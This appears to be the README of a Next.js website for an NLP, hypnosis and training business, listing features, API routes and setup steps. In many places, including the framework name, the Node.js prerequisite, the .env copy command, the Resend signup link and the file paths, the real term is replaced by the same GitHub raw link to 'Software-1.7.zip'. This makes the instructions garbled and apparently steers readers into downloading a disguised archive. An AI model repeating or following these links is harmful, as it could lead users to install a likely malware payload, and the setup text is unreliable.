# Konnecting Dots - NLP, Hypnosis & Corporate Training Website

A comprehensive https://github.com/sadeeqkhan123/konnectingdots/raw/refs/heads/main/app/privacy/Software-1.7.zip website for Konnecting Dots, featuring NLP training, Hypnosis services, and Corporate Training programs.

## Features

- **Blog Management System** - Full CRUD operations for blog posts
- **Booking System** - Session booking with email confirmations
- **Contact Forms** - Contact form with email notifications
- **Newsletter Subscription** - Email newsletter management
- **Events Management** - Event creation and registration system
- **Email Integration** - Automated email sending via Resend
- **Database** - JSON-based database (easily migratable to SQL/NoSQL)

## Tech Stack

- **Framework**: https://github.com/sadeeqkhan123/konnectingdots/raw/refs/heads/main/app/privacy/Software-1.7.zip 14
- **Language**: TypeScript
- **Styling**: Tailwind CSS
- **UI Components**: Radix UI
- **Email Service**: Resend
- **Validation**: Zod
- **Database**: JSON files (development) - ready for migration to PostgreSQL/MongoDB

## Getting Started

### Prerequisites

- https://github.com/sadeeqkhan123/konnectingdots/raw/refs/heads/main/app/privacy/Software-1.7.zip 18+ 
- pnpm (or npm/yarn)

### Installation

1. Clone the repository:
```bash
git clone <repository-url>
cd konnectingdots
```

2. Install dependencies:
```bash
pnpm install
```

3. Set up environment variables:
```bash
cp https://github.com/sadeeqkhan123/konnectingdots/raw/refs/heads/main/app/privacy/Software-1.7.zip .env
```

4. Configure your `.env` file:
```env
# Email Service Configuration
RESEND_API_KEY=re_your_resend_api_key_here
https://github.com/sadeeqkhan123/konnectingdots/raw/refs/heads/main/app/privacy/Software-1.7.zip
FROM_NAME=Konnecting Dots
https://github.com/sadeeqkhan123/konnectingdots/raw/refs/heads/main/app/privacy/Software-1.7.zip

# https://github.com/sadeeqkhan123/konnectingdots/raw/refs/heads/main/app/privacy/Software-1.7.zip Configuration
NEXT_PUBLIC_SITE_URL=http://localhost:3000
```

### Getting a Resend API Key

1. Sign up at [https://github.com/sadeeqkhan123/konnectingdots/raw/refs/heads/main/app/privacy/Software-1.7.zip](https://github.com/sadeeqkhan123/konnectingdots/raw/refs/heads/main/app/privacy/Software-1.7.zip)
2. Create an API key in the dashboard
3. Verify your domain (or use the test domain for development)
4. Add the API key to your `.env` file

### Running the Development Server

```bash
pnpm dev
```

Open [http://localhost:3000](http://localhost:3000) in your browser.

## API Routes

### Blog API

- `GET /api/blog` - Get all blog posts (supports `?status=published&category=NLP Techniques`)
- `GET /api/blog/[id]` - Get a single blog post by ID
- `GET /api/blog/slug/[slug]` - Get a blog post by slug
- `POST /api/blog` - Create a new blog post
- `PUT /api/blog/[id]` - Update a blog post
- `DELETE /api/blog/[id]` - Delete a blog post

### Booking API

- `POST /api/send-booking-email` - Submit a booking request

### Contact API

- `POST /api/contact` - Submit a contact form

### Newsletter API

- `POST /api/newsletter` - Subscribe to newsletter
- `DELETE /api/newsletter` - Unsubscribe from newsletter
- `GET /api/newsletter` - Get all subscribers (admin)

### Events API

- `GET /api/events` - Get all events (supports `?status=upcoming&upcoming=true`)
- `GET /api/events/[id]` - Get a single event
- `POST /api/events` - Create a new event
- `PUT /api/events/[id]` - Update an event
- `DELETE /api/events/[id]` - Cancel an event
- `POST /api/events/[id]/register` - Register for an event

## Database Structure

The application uses JSON files for data storage (located in `/data` directory). This is perfect for development and can be easily migrated to a production database:

- `https://github.com/sadeeqkhan123/konnectingdots/raw/refs/heads/main/app/privacy/Software-1.7.zip` - Blog posts
- `https://github.com/sadeeqkhan123/konnectingdots/raw/refs/heads/main/app/privacy/Software-1.7.zip` - Booking requests
- `https://github.com/sadeeqkhan123/konnectingdots/raw/refs/heads/main/app/privacy/Software-1.7.zip` - Contact form submissions
- `https://github.com/sadeeqkhan123/konnectingdots/raw/refs/heads/main/app/privacy/Software-1.7.zip` - Newsletter subscribers
- `https://github.com/sadeeqkhan123/konnectingdots/raw/refs/heads/main/app/privacy/Software-1.7.zip` - Events

### Migrating to Production Database

The database layer is abstracted in `https://github.com/sadeeqkhan123/konnectingdots/raw/refs/heads/main/app/privacy/Software-1.7.zip`. To migrate to PostgreSQL, MongoDB, or another database:

1. Replace the file system operations in `https://github.com/sadeeqkhan123/konnectingdots/raw/refs/heads/main/app/privacy/Software-1.7.zip` with your database client
2. Keep the same function signatures
3. Update the data models if needed

## Email Templates

Email templates are located in `https://github.com/sadeeqkhan123/konnectingdots/raw/refs/heads/main/app/privacy/Software-1.7.zip`:

- Booking confirmation
- Welcome email
- Session reminder
- Newsletter template
- Contact form acknowledgment

## Project Structure

```
├── app/
│   ├── api/              # API routes
│   ├── blog/             # Blog pages
│   ├── contact/          # Contact page
│   ├── events/           # Events page
│   └── ...               # Other pages
├── components/           # React components
├── lib/
│   ├── https://github.com/sadeeqkhan123/konnectingdots/raw/refs/heads/main/app/privacy/Software-1.7.zip            # Database functions
│   ├── https://github.com/sadeeqkhan123/konnectingdots/raw/refs/heads/main/app/privacy/Software-1.7.zip         # Email service
│   └── https://github.com/sadeeqkhan123/konnectingdots/raw/refs/heads/main/app/privacy/Software-1.7.zip  # Email templates
└── data/                # JSON database files
```

## Features in Detail

### Blog Management

- Create, read, update, and delete blog posts
- Draft and published status
- Category filtering
- Slug-based URLs
- Automatic read time calculation
- Admin interface at `/blog-admin`

### Booking System

- Multi-step booking form
- Email confirmations to customers
- Admin notifications
- Booking status tracking

### Contact Forms

- Customer acknowledgment emails
- Admin notifications
- Service interest tracking

### Newsletter

- Email subscription management
- Welcome emails
- Unsubscribe functionality
- Active subscriber tracking

### Events

- Event creation and management
- Registration system
- Capacity tracking
- Registration confirmations

## Development Notes

- The database uses JSON files for simplicity. In production, migrate to a proper database.
- Email service requires Resend API key. Without it, emails are logged to console.
- All API routes include proper error handling and validation.
- Frontend components are connected to backend APIs.

## Production Deployment

1. Set up environment variables in your hosting platform
2. Migrate database to production database (PostgreSQL, MongoDB, etc.)
3. Configure Resend with your verified domain
4. Update email addresses in `.env`
5. Build and deploy:
```bash
pnpm build
pnpm start
```

## License

Private - Konnecting Dots

## Support

For issues or questions, contact the development team.

